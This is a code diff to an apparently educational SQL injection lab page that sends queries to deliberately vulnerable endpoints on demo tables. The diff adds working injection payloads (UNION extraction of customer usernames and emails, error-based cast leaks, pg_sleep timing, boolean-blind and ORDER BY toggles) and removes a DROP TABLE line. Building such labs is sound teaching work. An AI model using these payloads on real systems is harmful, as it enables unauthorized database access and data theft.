@@ -72,9 +72,13 @@ const LOGIN_PAYLOADS = [
 ];
 
 const SEARCH_PAYLOADS = [
+  { label: "UNION Exfiltrate Customers", q: "' UNION SELECT id, username, email FROM demo_customers--" },
+  { label: "Error-Based Cast Data Leak", q: "1' AND 1=cast((SELECT username FROM demo_customers LIMIT 1) as int)--" },
+  { label: "Time-Based Sleep (3 Seconds)", q: "' AND 1=(SELECT 1 FROM pg_sleep(3))--" },
+  { label: "Boolean Blind (TRUE Condition)", q: "admin' AND (SELECT 1)=1--" },
+  { label: "Boolean Blind (FALSE Condition)", q: "admin' AND (SELECT 1)=2--" },
+  { label: "ORDER BY Condition Toggle", q: "(CASE WHEN 1=1 THEN price ELSE name END) ASC" },
   { label: "Wildcard dump", q: "%" },
-  { label: "UNION probe", q: "' UNION SELECT 1,2,3--" },
-  { label: "DROP attempt (read-only)", q: "'; DROP TABLE products--" },
   { label: "Comment bypass", q: "anything' OR '1'='1" },
 ];
 
@@ -297,14 +301,35 @@ export default function SQLiLabPage() {
 
   const testVulnSearch = async () => {
     setSearchLoading(true);
+    const t0 = Date.now();
     try {
-      const res = await fetch(`${LAB_API}/lab/sqli/vulnerable-search?q=${encodeURIComponent(searchQuery)}`);
+      // Intelligently route to specialized endpoint if specialized attack is selected
+      let endpoint = `${LAB_API}/lab/sqli/vulnerable-search?q=${encodeURIComponent(searchQuery)}`;
+      if (searchQuery.toLowerCase().includes('cast(')) {
+        endpoint = `${LAB_API}/lab/sqli/vulnerable-error?id=${encodeURIComponent(searchQuery)}`;
+      } else if (searchQuery.toLowerCase().includes('pg_sleep(')) {
+        endpoint = `${LAB_API}/lab/sqli/vulnerable-time?category=${encodeURIComponent(searchQuery)}`;
+      } else if (searchQuery.toLowerCase().includes('order by')) {
+        endpoint = `${LAB_API}/lab/sqli/vulnerable-order?sort=${encodeURIComponent(searchQuery.replace(/order by/i, '').trim())}`;
+      }
+
+      const res = await fetch(endpoint);
       const data = await res.json();
+      const elapsed = Date.now() - t0;
+      data.elapsedMs = elapsed;
       setVulnSearchResult(data);
-      addEvent('sqli/vulnerable-search', `${data.rows?.length} product(s) returned`, 'vuln');
+
+      if (data.error) {
+        addEvent('sqli/vulnerable-error', `DATA LEAKED VIA ERROR: ${data.error}`, 'vuln');
+      } else if (elapsed > 1500 || data.timeDelayed) {
+        addEvent('sqli/vulnerable-time', `TIME DELAY EXECUTED: took ${elapsed}ms`, 'vuln');
+      } else {
+        const count = data.rows?.length || data.products?.length || (data.exists ? 1 : 0);
+        addEvent('sqli/vulnerable-search', `${count} row(s) returned`, 'vuln');
+      }
     } catch (err) {
       setVulnSearchResult({ error: err.message });
-      addEvent('sqli/vulnerable-search', 'Request failed', 'error');
+      addEvent('sqli/vulnerable-search', 'Request failed: ' + err.message, 'error');
     } finally {
       setSearchLoading(false);
     }
